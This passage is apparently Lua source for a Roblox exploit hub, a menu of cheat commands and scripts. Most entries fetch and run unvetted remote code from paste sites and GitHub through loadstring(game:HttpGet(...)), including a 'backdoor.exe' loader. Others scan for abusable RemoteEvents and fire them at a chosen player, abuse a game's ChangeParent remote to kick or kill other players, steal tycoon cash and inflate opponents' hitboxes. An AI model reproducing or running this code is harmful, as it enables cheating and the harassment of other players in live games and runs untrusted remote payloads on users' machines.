		loadstring(game:HttpGet("https://raw.githubusercontent.com/exxtremestuffs/SimpleSpySource/master/SimpleSpy.lua%22"))()
	end

	if load_BackdoorEXE == true then
		loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/v8/src/main.lua%22"))()
	end

	local PingWords = {
		"destroy",
		"delete",
		"del",
		"place",
		"remove",
		"replicate",
		"loadstring",
		"rev",
		"admin",
		"create",
		"property",
		"spawn",
		"clear",
		"trash",
		"fire",
		"bomb",
		"explode",
		"color",
		"update",
		"car",
		"money",
		"cheat",
		"data",
		"save",
		"build",
		"backdoor",
		"invis",
		"hide",
		"set"
	}

	local PossibleRemotes = {}

	for i,v in pairs(game:GetDescendants()) do
		if v:IsA("RemoteEvent") then
			for x,z in pairs(PingWords) do
				if string.find(v.Name:lower(), z:lower()) then
					warn("Possible Vulnerability found : ".. v.Name.. " | "..v.ClassName)
					table.insert(PossibleRemotes, v)
				end
			end
		end
	end

	if load_DestroyToolTest == true then
		for i = 0, 100, 1 do
			for i,v in pairs(PossibleRemotes) do
				v:FireServer(game:GetService("Players")[Player.Value].Character.Head)
			end
		end
	end
end)

CreateCMD("bombtorso",function()
	--[[
	    Simple vulnerability scanner v1.1
	    Made by 0fiiz#7952
	]]--


	local load_BackdoorEXE = false
	local load_SimplySpy = false
	local load_DestroyToolTest = true

	if load_SimplySpy == true then
		loadstring(game:HttpGet("https://raw.githubusercontent.com/exxtremestuffs/SimpleSpySource/master/SimpleSpy.lua%22"))()
	end

	if load_BackdoorEXE == true then
		loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/v8/src/main.lua%22"))()
	end

	local PingWords = {
		"destroy",
		"delete",
		"del",
		"place",
		"remove",
		"replicate",
		"loadstring",
		"rev",
		"admin",
		"create",
		"property",
		"spawn",
		"clear",
		"trash",
		"fire",
		"bomb",
		"explode",
		"color",
		"update",
		"car",
		"money",
		"cheat",
		"data",
		"save",
		"build",
		"backdoor",
		"invis",
		"hide",
		"set"
	}

	local PossibleRemotes = {}

	for i,v in pairs(game:GetDescendants()) do
		if v:IsA("RemoteEvent") then
			for x,z in pairs(PingWords) do
				if string.find(v.Name:lower(), z:lower()) then
					warn("Possible Vulnerability found : ".. v.Name.. " | "..v.ClassName)
					table.insert(PossibleRemotes, v)
				end
			end
		end
	end

	if load_DestroyToolTest == true then
		for i = 0, 100, 1 do
			for i,v in pairs(PossibleRemotes) do
				v:FireServer(game:GetService("Players")[Player.Value].Character.Torso)
			end
		end
	end
end)

CreateCMD("view",function()
	game:GetService("Workspace").CurrentCamera.CameraSubject = game:GetService("Players")[Player.Value].Character.Humanoid
end)

CreateCMD("unview",function()
	game:GetService("Workspace").CurrentCamera.CameraSubject = game:GetService("Players").LocalPlayer.Character.Humanoid
end)

CreateCMD("goto",function()
	game:GetService("Players").LocalPlayer.Character:PivotTo(game:GetService("Players")[Player.Value].Character:GetPivot())
end)

CreateCMD("info",function()
	local plr = game:GetService("Players")[Player.Value]
	print("--- INFO ---")
	print("Name: "..plr.Name)
	print("DisplayName: "..plr.DisplayName)
	print("Account Age: "..tostring(plr.AccountAge))
	print("Membership: "..tostring(plr.MembershipType))
	print("--- END. ---")
end)

CreateScript("RemoteTestTool",function()
	--[[
	    Simple vulnerability scanner v1.1
	    Made by 0fiiz#7952
	]]--


	local load_BackdoorEXE = false
	local load_SimplySpy = false
	local load_DestroyToolTest = true

	if load_SimplySpy == true then
		loadstring(game:HttpGet("https://raw.githubusercontent.com/exxtremestuffs/SimpleSpySource/master/SimpleSpy.lua%22"))()
	end

	if load_BackdoorEXE == true then
		loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/v8/src/main.lua%22"))()
	end

	local PingWords = {
		"destroy",
		"delete",
		"del",
		"place",
		"remove",
		"replicate",
		"loadstring",
		"rev",
		"admin",
		"create",
		"property",
		"spawn",
		"clear",
		"trash",
		"fire",
		"bomb",
		"explode",
		"color",
		"update",
		"car",
		"money",
		"cheat",
		"data",
		"save",
		"build",
		"backdoor",
		"invis",
		"hide",
		"set"
	}

	local PossibleRemotes = {}

	for i,v in pairs(game:GetDescendants()) do
		if v:IsA("RemoteEvent") then
			for x,z in pairs(PingWords) do
				if string.find(v.Name:lower(), z:lower()) then
					warn("Possible Vulnerability found : ".. v.Name.. " | "..v.ClassName)
					table.insert(PossibleRemotes, v)
				end
			end
		end
	end
	
	if load_DestroyToolTest == true then
		removething("RTT Tool",game:GetService("Players").LocalPlayer.Backpack)
		
		local RemoteTestTool = Instance.new("Tool",game:GetService("Players").LocalPlayer.Backpack)
		RemoteTestTool.Name = "RTT Tool"
		RemoteTestTool.RequiresHandle = false
		RemoteTestTool.Activated:Connect(function()
			for i,v in pairs(PossibleRemotes) do
				v:FireServer(game:GetService("Players").LocalPlayer:GetMouse().Target)
			end
		end)
	end
end)

CreateCMD("kick",function()
game:GetService("ReplicatedStorage").Events.Tools.ChangeParent:FireServer(game:GetService("Players")[Player.Value])
end)

CreateCMD("punish",function()
game:GetService("ReplicatedStorage").Events.Tools.ChangeParent:FireServer(game:GetService("Players")[Player.Value].Character)
end)

Follow = false

CreateCMD("annoy",function()
	local p = game:GetService("Players")[Player.Value]
	if p.Character and p.Character:FindFirstChild("Humanoid") then
		if Follow == true then
			Follow = false; return
		else Follow = true end
		while Follow == true do
			game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = p.Character.HumanoidRootPart.CFrame
			wait()
		end
	end
end)

CreateCMD("unannoy",function()
Follow = false
end)

CreateScript("Infinite Yield Admin",function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
end)

CreateScript("Dex",function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/main/dex.lua"))()
end)

CreateScript("Rekt Hub",function()
loadstring(game:HttpGet(("https://paste.website/p/fce88396-87e3-4ed8-bb8c-1593ff174d0d.txt"), true))()
end)

CreateScript("Red All",function()
loadstring(game:HttpGet(("https://paste.website/p/a6956ce1-5a86-4da8-887f-5f828b44dd0a.txt"), true))() -- Red all
end)

CreateScript("HD Admin Brickspam",function()
loadstring(game:HttpGet(("https://paste.website/p/fcfa5271-b26f-4611-bea6-9c369dc73546.txt"), true))() -- Hd brickspam
end)

CreateScript("Bread",function()
loadstring(game:HttpGet(("https://paste.website/p/67e65cf2-1afe-4467-b04c-5ec95566807c.txt"), true))() -- bread
end)

CreateScript("Bat Gui",function()
loadstring(game:HttpGet(("https://paste.website/p/cf170836-00b6-480f-b3a4-6170a4ed730f.txt"), true))() -- Bat gui
end)

CreateScript("Box Admin",function()
loadstring(game:HttpGet(("https://paste.website/p/166b9fb0-5ab6-4555-911d-0c7e4af9b608.txt"), true))() -- Box admin
end)

CreateScript("WeAreSkids",function()
loadstring(game:HttpGet(("https://paste.website/p/fb3f5729-dd7b-44af-a145-3badfffb755a.txt"), true))() -- WeAreSkids
end)

CreateScript("Redwood Ruinier",function()
loadstring(game:HttpGet(("https://paste.website/p/aff15b93-2531-4d9b-a62a-1108fd125e24.txt"), true))() -- red wood
end)

CreateScript("Tycoon Hax",function()
loadstring(game:HttpGet(("https://rawscripts.net/raw/Super-Hero-Tycoon-Haxx-9731"), true))()
end)

CreateScript("ScriptBlox Searcher",function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/AZYsGithub/chillz-workshop/main/ScriptSearcher"))() -- not made by kosovo this time
end)

CreateScript("Steal Tycoon Cash",function()
	for f, g in pairs(game:GetService("Workspace"):GetDescendants()) do
         if g.Name == "Giver" then
             firetouchinterest(game:GetService("Players").LocalPlayer.Character.HumanoidRootPart, g, 0)
             firetouchinterest(game:GetService("Players").LocalPlayer.Character.HumanoidRootPart, g, 1)
         end
     end
end)

CreateScript("No Tycoon Doors",function()
	for f, g in pairs(game:GetService("Workspace"):GetDescendants()) do
       if g.Name == "Pipe" then
           g:Destroy()
       end
    end
end)

CreateScript("Delete Roleplay Tool",function()
	mouse = game:GetService("Players").LocalPlayer:GetMouse()
	tool = Instance.new("Tool")
	tool.RequiresHandle = false
	tool.Name = "Delete tool"
	tool.Activated:Connect(function()
	game:GetService("ReplicatedStorage").Events.Tools.ChangeParent:FireServer(mouse.Target)
	end)
	tool.Parent = game:GetService("Players").LocalPlayer.Backpack
end)

CreateScript("Kill Roleplay Tool",function()
	mouse = game:GetService("Players").LocalPlayer:GetMouse()
	tool = Instance.new("Tool")
	tool.RequiresHandle = false
	tool.Name = "Kill tool"
	tool.Activated:Connect(function()
	if mouse.Target.Parent:FindFirstChild("Humanoid") then
	game:GetService("ReplicatedStorage").Events.Tools.ChangeParent:FireServer(mouse.Target.Parent:FindFirstChild("Head"):WaitForChild("Neck"))
	end
	end)
	tool.Parent = game:GetService("Players").LocalPlayer.Backpack
end)

CreateScript("Kick Others Roleplay",function()
	for i,v in pairs(game:GetService("Players"):GetChildren()) do
		if v:IsA("Player") then
			if v.Name ~= game:GetService("Players").LocalPlayer.Name then
				game:GetService("ReplicatedStorage").Events.Tools.ChangeParent:FireServer(v,nil)
			end
		end
	end
end)

CreateScript("Punish Others Roleplay",function()
	for i,v in pairs(game:GetService("Players"):GetChildren()) do
		if v:IsA("Player") then
			if v.Name ~= game:GetService("Players").LocalPlayer.Name then
				game:GetService("ReplicatedStorage").Events.Tools.ChangeParent:FireServer(v.Character,nil)
			end
		end
	end
end)

CreateScript("Walkless Others Roleplay",function()
	for i,v in pairs(game:GetService("Players"):GetChildren()) do
		if v:IsA("Player") then
			if v.Name ~= game:GetService("Players").LocalPlayer.Name then
				game:GetService("ReplicatedStorage").Events.Tools.ChangeParent:FireServer(v.Character.HumanoidRootPart,nil)
			end
		end
	end
end)

CreateScript("Kill Others Roleplay",function()
	for i,v in pairs(game:GetService("Players"):GetChildren()) do
		if v:IsA("Player") then
			if v.Name ~= game:GetService("Players").LocalPlayer.Name then
				game:GetService("ReplicatedStorage").Events.Tools.ChangeParent:FireServer(v.Character:WaitForChild("Head"):WaitForChild("Neck"),nil)
			end
		end
	end
end)

CreateScript("HitBox & Infjump",function()
local InfiniteJumpEnabled = true game:GetService("UserInputService").JumpRequest:connect(function() if InfiniteJumpEnabled then game:GetService"Players".LocalPlayer.Character:FindFirstChildOfClass'Humanoid':ChangeState("Jumping") end end)
game.Players.LocalPlayer.UserId = "2205774994"
_G.HeadSize = 20 _G.Disabled = true game:GetService('RunService').RenderStepped:connect(function() if _G.Disabled then for i,v in next, game:GetService('Players'):GetPlayers() do if v.Name ~= game:GetService('Players').LocalPlayer.Name then pcall(function() v.Character.HumanoidRootPart.Size = Vector3.new(_G.HeadSize,_G.HeadSize,_G.HeadSize) v.Character.HumanoidRootPart.Transparency = 0.7 v.Character.HumanoidRootPart.BrickColor = BrickColor.new("Really blue") v.Character.HumanoidRootPart.Material = "Neon" v.Character.HumanoidRootPart.CanCollide = false end) end end end end)
end)

CreateScript("Arabic Admin Room",function()
game.Players.LocalPlayer.Character:MoveTo(Vector3.new(-589.1566772460938, -34.270896911621094, 241.41119384765625))
end)

CreateScript("Arabic Spawn Point",function()
game.Players.LocalPlayer.Character:MoveTo(Vector3.new(-592.3201293945312, 52.972572326660156, 164.14683532714844))
end)

CreateScript("Package Plugins",function()
CreateCMD("lray",function()
-- Red Hyper Laser Gun
game:GetService("Players").LocalPlayer.Character:WaitForChild("Hyperlasergun",0.1):WaitForChild("ServerControl",0.1):InvokeServer("Click",true,game:GetService("Players")[Player.Value].Character.Head.Position)
end)
CreateCMD("ray",function()
-- Black Hole Gear
game:GetService("Players").LocalPlayer.Character:WaitForChild("Gravity Inducer").WeaponEvent:FireServer("Fire",game:GetService("Players")[Player.Value].Character.Head.Position)
end)
end)

--// AutomaticBlox
local scripts = {
	["RobloxHacks"] = game:HttpGet("https://paste.website/p/1ca2aab2-5999-46d8-b9d1-39eb4a442eb9.txt"),
	["LazyHub"] = game:HttpGet("https://paste.website/p/28c3971b-674d-42c3-afd2-1af396eeddd1.txt"),
	["Hydroxide Spy"] = game:HttpGet("https://raw.githubusercontent.com/Upbolt/Hydroxide/revision/ui/modules/RemoteSpy.lua"),
	["Mr Spy V2"] = game:HttpGet("https://raw.githubusercontent.com/harisiskandar178/Roblox-Script/main/mrspy%20v2.txt"),
	["Mr Spy V1"] = game:HttpGet("https://pastebin.com/raw/bbYeT7z5"),
	["Remote2Script Spy"] = game:HttpGet("https://raw.githubusercontent.com/ou1z/Roblox-Scripts/master/Remote2Script.lua"),
	["Simple Spy"] = game:HttpGet("https://raw.githubusercontent.com/exxtremestuffs/SimpleSpySource/master/SimpleSpy.lua"),
	["0fiiz Vuln Checker"] = game:HttpGet("https://paste.website/p/deacbe63-7727-4a6c-add9-3be90e15002e.txt"),
	["Kosovo Vuln Checker"] = game:HttpGet("https://paste.website/p/e29ced8a-952e-4e59-9cb3-d15651694f3b.txt"),
	["Prison Commands"] = game:HttpGet("https://pastebin.com/raw/1RvgFtcx"),
	["Prison Killer"] = game:HttpGet("https://paste.website/p/2e644f91-e064-49e0-972d-07476acd31c3.txt"),
	["Prison Ware"] = game:HttpGet("https://raw.githubusercontent.com/Denverrz/scripts/master/PRISONWARE_v1.3.txt"),
	["illremember Shattervast Admin"] = game:HttpGet("https://pastebin.com/raw/iL4NRDux"),
	["illremember Reviz Admin"] = game:HttpGet("https://pastebin.com/raw/Caniwq2N"),
	["illremember OPFinality Hub"] = game:HttpGet("https://pastebin.com/raw/T5Y2zbyT"),
	["illremember Animation Hub"] = game:HttpGet("https://pastebin.com/raw/0MLPL32f"),
	["Google Script Hub"] = game:HttpGet("https://pastebin.com/raw/JcNAaJvZ"),
	["Swim Hub"] = game:HttpGet("https://raw.githubusercontent.com/SwimPaste/swimhack/main/swimloader_ui.lua"),
	["V.G Hub"] = game:HttpGet("https://raw.githubusercontent.com/1201for/V.G-Hub/main/V.Ghub"),
	["VHub (keys)"] = game:HttpGet("https://raw.githubusercontent.com/V31nc/2642/Created/VHub"),
	["Fanmade Synapse Hub"] = game:HttpGet("https://paste.website/p/49cb753f-6618-4e2a-a23d-be5723a5b7b3.txt"),
	["ClickTweens"] = game:HttpGet("https://paste.website/p/72bec212-54ea-4050-9d71-a0476981e69f.txt"),
	["Erased Admin"] = game:HttpGet("https://paste.website/p/7d6deca7-b380-4bc0-98cb-46695e073fba.txt"),
}

for i,v in pairs(scripts) do
	CreateScript(i,function()
	loadstring(v)() -- not made by kosovo this time
	end)
end

--// Initalizing
count = 0
for i,v in pairs(ScrollingFrame:GetChildren()) do
if v:IsA("TextButton") then
count = count + 1
end
end
fourmula = math.floor(count / 3) - 7.5
ScrollingFrame.CanvasSize = UDim2.new(0,0,fourmula,0)